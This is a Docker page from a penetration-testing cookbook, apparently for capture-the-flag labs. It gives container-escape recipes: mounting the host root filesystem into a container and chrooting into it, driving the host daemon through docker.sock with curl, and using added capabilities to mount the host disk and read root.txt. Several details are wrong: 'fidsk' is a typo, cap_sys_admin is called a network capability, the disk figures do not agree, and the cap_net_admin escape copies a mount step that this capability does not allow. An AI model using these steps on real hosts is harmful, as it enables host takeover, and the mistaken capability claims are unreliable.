---
layout: default
title: Docker
parent: COOKBOOKS
has_children: false
has_toc: false
---

{% include toc.html %}

## References

[PrivEsc with docker](https://medium.com/@Affix/privilege-escallation-with-docker-56dc682a6e17)

[Docker socket](https://medium.com/better-programming/about-var-run-docker-sock-3bfd276e12fd)

[GTFOBins docker page](https://gtfobins.github.io/gtfobins/docker/)

[Docker run command](https://docs.docker.com/engine/reference/commandline/container_run/)

[Docker api reference](https://docs.docker.com/engine/api/v1.40/#)

[Container escape](https://attackdefense.com/challengedetailsnoauth?cid=1196)

[Container escape](https://attackdefense.com/challengedetailsnoauth?cid=1197)

<br />

## Docker run
See the [docker run cli reference](https://docs.docker.com/engine/reference/commandline/container_run/) for more details and a full list of options.

|Command|Description|
|:---|:---|
|`--rm`|Automatically remove the container when finished.|
|`--interactive`, `-i`|Start the container in interactive mode so you can use it.|
|`--tty`, `-t`|Start a `tty` so you can interactive with the container.|
|`--volume`, `-v`|Mount a volume at the specified location.|
|`--volume /:/mnt`|Mount the root of the host to `/mnt` within the container.|
|`--volume /root:/mnt`|Mount root's home folder of the host to `/mnt/` within the container.|

<br />

## Container Escapes
*In general, you probably need to be `root` in container before trying to escape it.*  

<br />

### Docker run
You'll need a `docker` binary in the container in order to use `docker run`. If you have a shell on the host system you can check if the host and the container are on the same network. If they are, you may be able to `wget` the docker binary from the host to the container.

```
// Download the 'hello-world' container from the docker repo and run it.
docker run hello-world

// Run the 'ubuntu' container in interactive mode with a tty and execute the command /bin/bash to return a shell and automatically clean up once complete.
docker run --rm --interactive --tty ubuntu /bin/bash

// Shorthand version of the same command.
docker run --rm -it ubuntu /bin/bash

// Mount the entire / volume of the host machine to /mnt within the container 'ubuntu' and performs a 'chroot' on /mnt inside the container.
docker run --rm --volume /:/mnt -it ubuntu chroot /mnt

// Mount the /root directory of the host machine to /mnt within the container.
docker run --rm --volume /root:/mnt -it ubuntu
```

<br />

### Docker socket
If there is a `docker.sock` socket in `/var/run/` of the container, you can communicate with the docker daemon on the host (see [this article](https://medium.com/better-programming/about-var-run-docker-sock-3bfd276e12fd) for more details). Most of the docker endpoints are mapped to commands, for example `GET http://localhost/containers/json` maps to `docker ps`. See the right-hand side of the [docker specification](https://docs.docker.com/engine/api/v1.40/#) page for details of the endpoints. For example:

```
// Request the summary image data..
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
```

`POST` can be used to do things like create and run containers, for example:

```
// Create a container via the docker.sock socket.
curl -X POST --unix-socket /var/run/docker.sock -d '{"Image":"nginx"}' -H 'Content-Type: application/json' http://localhost/containers/create

{"Id":"age65...g45","Warnings":null}

// Start the container.
curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers/age65...g45/start
```

<br />

### Container started with cap_sys_admin network admin capability
*This needs `root` in the container first.*

[See this video for walkthrough](https://attackdefense.com/challengedetailsnoauth?cid=1196)

If the container has been started in privileged mode or with additional capabilities, it may be possible to mount the host file system and execute commands as root. First, check for the `cap_sys_admin` network admin privilege:
```
capsh --print | grep -i cap_sys_admin
```

If `cap_sys_admin` is present in the output, check what disks can be found:
```
fidsk -l
```

**Disk /dev/sda: 20GiB, 12474836480 bytes, 41943040 sectors**<br />
Units: ...<br />
<br />
**Device&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Start&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;End&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sectors&nbsp;&nbsp;&nbsp;Size&nbsp;&nbsp;&nbsp;&nbsp;Type**<br />
/dev/sda1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2048&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4095&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2048&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1M&nbsp;&nbsp;&nbsp;&nbsp;BIOS boot<br />
/dev/sda2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4096&nbsp;&nbsp;&nbsp;&nbsp;37746687&nbsp;&nbsp;&nbsp;&nbsp;37742592&nbsp;&nbsp;&nbsp;&nbsp;18G&nbsp;&nbsp;&nbsp;&nbsp;Linux filesystem<br />
/dev/sda3&nbsp;&nbsp;&nbsp;&nbsp;37746688&nbsp;&nbsp;&nbsp;&nbsp;41940991&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4194304&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2G&nbsp;&nbsp;&nbsp;&nbsp;Linux swap<br />

<br />

From the output it's clear the host file system can be found on `/dev/sda2`. Mount the filesystem:
```
mkdir /tmp/m
mount /dev/sda2 /tmp/m
```

Use `chroot` to change bash's `root` location to the mount point:
```
chroot /tmp/m bash
```

Cat the flag:
```
cd /root/
cat root.txt
```

<br />

### Container started with cap_net_admin network admin capability
*This needs `root` in the container first.*

[See this video for walkthrough](https://attackdefense.com/challengedetailsnoauth?cid=1197)

If the container has been started in privileged mode or with additional capabilities, it may be possible to mount the host file system and execute commands as root. First, check for the `cap_net_admin` network admin privilege:
```
capsh --print | grep -i cap_net_admin
```

If `cap_net_admin` is present in the output, check what disks can be found:
```
fidsk -l
```

**Disk /dev/sda: 20GiB, 12474836480 bytes, 41943040 sectors**<br />
Units: ...<br />
<br />
**Device&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Start&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;End&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sectors&nbsp;&nbsp;&nbsp;Size&nbsp;&nbsp;&nbsp;&nbsp;Type**<br />
/dev/sda1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2048&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4095&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2048&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1M&nbsp;&nbsp;&nbsp;&nbsp;BIOS boot<br />
/dev/sda2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4096&nbsp;&nbsp;&nbsp;&nbsp;37746687&nbsp;&nbsp;&nbsp;&nbsp;37742592&nbsp;&nbsp;&nbsp;&nbsp;18G&nbsp;&nbsp;&nbsp;&nbsp;Linux filesystem<br />
/dev/sda3&nbsp;&nbsp;&nbsp;&nbsp;37746688&nbsp;&nbsp;&nbsp;&nbsp;41940991&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4194304&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2G&nbsp;&nbsp;&nbsp;&nbsp;Linux swap<br />

<br />

From the output it's clear the host file system can be found on `/dev/sda2`. Mount the filesystem:
```
mkdir /tmp/m
mount /dev/sda2 /tmp/m
```

You can now query the mounted file system:
```
cd /tmp/m/root
cat root.txt
```